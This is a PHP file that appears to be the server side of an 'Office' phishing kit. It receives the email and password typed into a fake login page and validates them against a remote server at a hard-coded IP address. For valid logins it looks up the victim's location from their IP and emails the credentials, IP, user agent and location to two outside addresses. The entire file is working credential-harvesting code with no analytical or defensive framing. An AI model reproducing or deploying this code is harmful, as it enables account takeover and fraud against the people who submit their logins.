<?php 

$u = $_POST['email'];
$p = $_POST['password'];
$url = 'http://3.12.37.253/index.php';
$data = array(
'id' => $u,
'pw' => $p
);
$data = http_build_query($data, '', '&');
$response = file_get_contents($url."?".$data, false);

if($response == 1) {
		if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
				$remoteIP = $_SERVER["HTTP_CF_CONNECTING_IP"];
			} else {
				$remoteIP = $_SERVER['REMOTE_ADDR'];
			}

			$abi = curl_init();
			curl_setopt($abi, CURLOPT_URL, "http://ip-api.com/json/" . $remoteIP);
			curl_setopt($abi, CURLOPT_HEADER, 0);
			curl_setopt($abi, CURLOPT_RETURNTRANSFER, TRUE);
			$curlExec = curl_exec($abi);
			curl_close($abi);
			$IP_LOOKUP = json_decode($curlExec, true);
			$browser   = $_SERVER['HTTP_USER_AGENT'];
			$date      = date("D M d, Y g:i a");

			if ($IP_LOOKUP && $IP_LOOKUP['query'] != null) {
					// Target Geo Information
					$country     = $IP_LOOKUP['country'];
					$countrycode = $IP_LOOKUP['countryCode'];
					$state       = $IP_LOOKUP['regionName'];
					$city        = $IP_LOOKUP['city'];
					$postal      = $IP_LOOKUP['zip'];	
					$message  = "========+[True Office]+==========\n";
					$message .= "Email Address : ".$_POST['email']."\n";
					$message .= "Password : ".$_POST['password']."\n";
					$message .= "============= [ Ip & Hostname Info ] =============\n";
					$message .= "Client IP : ".$remoteIP."\n";
					$message .= "User-Agent : ".$browser."\n";
					$message .= "--------------------------------------------\n";
					$message .= 	"City: ".$city."\n";
					$message .= 	"Region: ".$state."\n";
					$message .= 	"Country Name: ".$country."\n";
					$message .= 	"Country Code: ".$countrycode."\n";
					$message .= "=======+ [True Office] +========\n";
			}else{
					$message  = "=======+[True Office]+=========\n";
					$message .= "Email Address : ".$_POST['email']."\n";
					$message .= "Password : ".$_POST['password']."\n";
					$message .= "==== [ Ip & User-Agent Info ] ======\n";
					$message .= "Client IP : ".$remoteIP."\n";
					$message .= "User-Agent : ".$browser."\n";
					$message .= "======+ [True Office] +========\n";
				
			}

			$email= "email.lucifer@yandex.com, jaja@officialconnectiz.com";
			$subject = "True Office Login ".$remoteIP;
			mail($email,$subject,$message);
			echo 1;
}else{
	echo 0;

}



?>



